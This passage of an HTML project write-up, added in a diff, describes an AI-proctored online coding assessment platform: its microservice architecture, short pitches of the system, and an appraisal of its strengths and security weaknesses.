+│  │              │  │              │  │  ├─ MediaPipe FaceMesh │  │
+│  │ Auth Context │  │ 11 languages │  │  └─ Canvas Overlay     │  │
+│  │ Exam Context │  │              │  │                        │  │
+│  │ Monitor Ctx  │  │              │  │  Webcam (MediaStream)  │  │
+│  └──────┬───────┘  └──────┬───────┘  └───────────┬───────────┘  │
+│         │                 │                       │               │
+│  ┌──────┴─────────────────┴───────────────────────┴──────────┐   │
+│  │            useAntiCheating (18+ event listeners)           │   │
+│  │            useCopyPasteProtection (13 handlers)             │   │
+│  └──────┬────────────────────────────────────┬───────────────┘   │
+└─────────┼────────────────────────────────────┼───────────────────┘
+          │ REST/JSON (Bearer JWT)              │ WebSocket
+          │ Port 8080                           │ Port 8082
+          ▼                                     ▼
+┌──────────────────────┐           ┌──────────────────────┐
+│   backend-auth (Go)  │           │  yolo-proctor (Py)   │
+│                      │           │                      │
+│  Auth (register,     │           │  FastAPI + Uvicorn   │
+│    login, JWT)       │           │  YOLOv8-Nano model   │
+│  Compiler (os/exec)  │           │  WebSocket handler   │
+│  Timer (singleton)   │           │  Base64 → OpenCV     │
+│  Malpractice logs    │           │  → YOLO inference    │
+│  Email (Resend)      │           │  → JSON response     │
+│  Problems &amp; Tests    │           │                      │
+│  Leaderboard         │           └──────────────────────┘
+│  Exam Sessions       │
+└──────────┬───────────┘
+           │ GORM (SQL)
+           ▼
+┌──────────────────────┐    ┌──────────────────────┐
+│  Supabase PostgreSQL │    │     Resend API       │
+│  (Production)        │    │  (Email Delivery)    │
+│                      │    │                      │
+│  9 Tables:           │    │  POST /emails        │
+│  admins, users,      │    │  HTML malpractice    │
+│  exam_sessions,      │    │  alerts to admins    │
+│  questions,          │    └──────────────────────┘
+│  test_cases,         │
+│  submissions,        │    ┌──────────────────────┐
+│  leaderboards,       │    │   Anticheating (Go)  │
+│  exam_timers,        │    │   Port 8081          │
+│  malpractice_logs    │    │   Session monitor    │
+│                      │    │   Heartbeat checker  │
+│  SQLite fallback     │    │   Offline detection  │
+└──────────────────────┘    └──────────────────────┘
+</code></pre>
+<hr>
+<h1>30. 30-SECOND / 1-MINUTE / 3-MINUTE EXPLANATIONS</h1>
+<h2>30-Second Explanation</h2>
+<blockquote>
+<p>&quot;System Monitoring is an AI-powered secure online coding assessment platform. Candidates solve programming problems in a Monaco code editor while three AI models — COCO-SSD, YOLOv8, and MediaPipe — monitor their webcam in real-time for unauthorized objects like phones and suspicious head movements. The browser enforces fullscreen mode and blocks copy-paste, tab switching, and DevTools. All violations are logged to a PostgreSQL database and trigger instant email alerts to administrators. The backend, built in Go with Gin, compiles and executes code in seven programming languages.&quot;</p>
+</blockquote>
+<h2>1-Minute Explanation</h2>
+<blockquote>
+<p>&quot;This is a full-stack AI-proctored coding assessment system with four microservices. The React frontend provides a professional exam environment with a Monaco code editor, problem descriptions, and an AI camera widget. Three concurrent AI models run during the exam: COCO-SSD runs in the browser via TensorFlow.js for object detection, MediaPipe analyzes facial landmarks to detect gaze shifts, and YOLOv8 runs on a Python FastAPI server receiving webcam frames over WebSocket. </p>
+<p>The Go backend handles authentication via JWT, executes candidate code in seven languages using os/exec with 5-second timeouts, manages a centralized exam timer that admins can start/pause/extend, and logs all malpractice events to Supabase PostgreSQL. When a violation is detected, an HTML email alert is sent asynchronously to all registered admins via the Resend API.</p>
+<p>The anti-cheating system has 20+ browser event listeners blocking copy-paste, DevTools, tab switching, and fullscreen exit. Three warnings lock the exam. The system features an offline fallback mode using localStorage when the backend is unavailable.&quot;</p>
+</blockquote>
+<h2>3-Minute Deep Technical Explanation</h2>
+<blockquote>
+<p>&quot;Let me walk you through the complete technical architecture. The system has four microservices orchestrated by a single batch script for local development and deployed separately on Vercel and Render.com.</p>
+<p><strong>Frontend</strong>: A React 19 SPA built with Vite and TypeScript, using TailwindCSS for styling. It has three React contexts forming a provider hierarchy: AuthContext manages JWT tokens stored in localStorage with automatic profile rehydration. ExamContext manages the coding state — it polls the backend timer every 1.5 seconds and runs a local 1-second countdown ticker for smooth UX. MonitoringContext is the security brain — it maintains a confidence score starting at 94 that decreases with each violation, a risk score, and a warning counter that locks the exam after 3 high-severity warnings.</p>
+<p>The API client is a 1,367-line module implementing a dual-mode pattern: every API call first tries the real Go backend with a 3.5-second abort timeout. If the backend is unreachable — common with Render.com&#39;s free tier cold starts — it falls back to localStorage-based simulation with mock evaluators.</p>
+<p><strong>Anti-Cheating</strong>: The useAntiCheating hook attaches 18+ event listeners in the capture phase: it blocks right-click, clipboard operations, modifier key shortcuts, Alt+Tab, and DevTools shortcuts. It intercepts the Escape key and uses the experimental Keyboard Lock API to prevent Chrome&#39;s hold-to-exit fullscreen mechanism. The useCopyPasteProtection hook adds a second layer with CSS user-select injection and 13 more capture-phase handlers.</p>
+<p><strong>AI Vision</strong>: The AICameraWidget is an 830-line React component running three concurrent AI systems. COCO-SSD loads from the npm bundle via TensorFlow.js using the lite_mobilenet_v2 backbone — it runs model.detect() on video frames every 200ms, filtering for phones (≥28% confidence), laptops, books, and calculators. MediaPipe FaceMesh loads from CDN, processes face landmarks to compute yaw and pitch ratios — if the head turns beyond threshold for 3 consecutive frames, a focus shift alert fires. YOLOv8-Nano runs on a Python FastAPI WebSocket server — the browser captures frames to a 480x360 canvas, encodes as JPEG base64 at 55% quality, and sends via WebSocket every 200ms. The server decodes with OpenCV, runs YOLOv8 inference at 25% minimum confidence, and returns detection results as JSON.</p>
+<p><strong>Backend</strong>: The Go service uses the Gin framework with a clean Controller → Service → Repository → GORM architecture. Authentication uses bcrypt for password hashing and JWT with HS256 for stateless tokens. The compiler service is a multi-language code execution engine — it creates temporary directories, writes source files, compiles (for Go/Java/C++/Rust), and executes with a 5-second context deadline. The test comparison is string-based: trimmed stdout vs expected output.</p>
+<p><strong>Database</strong>: Supabase-hosted PostgreSQL with 9 GORM-managed tables, featuring a triple fallback strategy — Supabase → local PostgreSQL → SQLite for development. The ExamTimer is a singleton row (ID=1) with accumulated seconds tracking for pause/resume support.</p>
+<p><strong>Malpractice Pipeline</strong>: When any detection fires, MonitoringContext.reportViolation() creates an event, adjusts scores, and calls the API. The backend&#39;s MalpracticeService auto-looks up candidate details from the users table, persists the log, and fires a goroutine to send HTML emails via Resend to all registered admins. The email sending is completely non-blocking — database persistence happens first, and email failure never affects the API response.&quot;</p>
+</blockquote>
+<hr>
+<h1>WHAT I NOW UNDERSTAND ABOUT THIS PROJECT</h1>
+<p>This is a <strong>comprehensive, multi-service AI-proctored coding assessment platform</strong> built as a college/capstone project by Kishore S from Sri Shakthi Institute of Engineering and Technology. It demonstrates genuine full-stack engineering competence across four languages (TypeScript, Go, Python, SQL), three AI/ML models, real-time WebSocket communication, and production deployment on Vercel/Render/Supabase.</p>
+<p><strong>Strengths</strong>: The triple-layer AI detection (COCO-SSD + YOLOv8 + MediaPipe) provides genuine redundancy. The offline fallback system in the API client shows production thinking. The anti-cheating hook is genuinely sophisticated with 20+ event interceptions including the creative Keyboard Lock API usage. The email system with HTML templates and async goroutine dispatch is production-grade.</p>
+<p><strong>Weaknesses</strong>: The code execution engine has no sandboxing (critical security gap). Credentials are hardcoded in render.yaml. CORS allows all origins. Admin registration is unrestricted. The malpractice endpoint is unauthenticated. Timer uses HTTP polling instead of WebSocket. The 59KB monolithic API client needs decomposition.</p>
+<p><strong>Classification</strong>: This is a <strong>highly impressive prototype/proof-of-concept</strong> that demonstrates end-to-end system design, AI integration, real-time communication, and security-conscious thinking. With sandboxed code execution, proper secret management, and authentication hardening, it could approach production readiness.</p>
+
+</body>
+</html>
